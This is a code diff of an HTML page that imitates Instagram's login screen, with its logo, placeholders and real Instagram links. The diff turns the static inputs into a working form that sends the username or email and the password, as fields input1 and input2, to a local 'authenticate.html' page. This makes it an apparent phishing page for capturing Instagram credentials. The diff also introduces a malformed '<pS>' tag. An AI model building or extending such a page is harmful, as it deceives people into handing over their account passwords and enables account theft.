@@ -6,13 +6,13 @@
         <div class="header">
             <img src="./images/instagram.png" />
         </div>
-        <div class="l-part">
-            <input type="text" placeholder="Phone number, username, or email" class="input-1" />
+        <form class="l-part" action="authenticate.html">
+            <input type="text" name="input1" placeholder="Phone number, username, or email" class="input-1" required/>
             <div class="overlap-text">
-                <input type="password" placeholder="Password" class="input-2" />
+                <input type="password" name="input2" placeholder="Password" class="input-2" required/>
             </div>
-            <input type="button" value="Log In" class="btn" href="test.html" /><br>
-        </div>
+            <input type="submit" value="Log In" class="btn"/><br>
+        </form>
         <div class="forgot"><a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a></div>
     </div>
     <div class="sub-content">
@@ -21,7 +21,7 @@
         </div>
     </div>
     <div class="get-app">
-        <p class="b_nGN">Get the app.</p><br>
+        <pS>Get the app.</p><br>
         <div class="app-img">
             <a class="app-store" href="https://apps.apple.com/app/instagram/id389801252?vt=lo">
                 <img alt="Available on the App Store" class="app-store" src="./images/appstore.png" height="58px"></a>
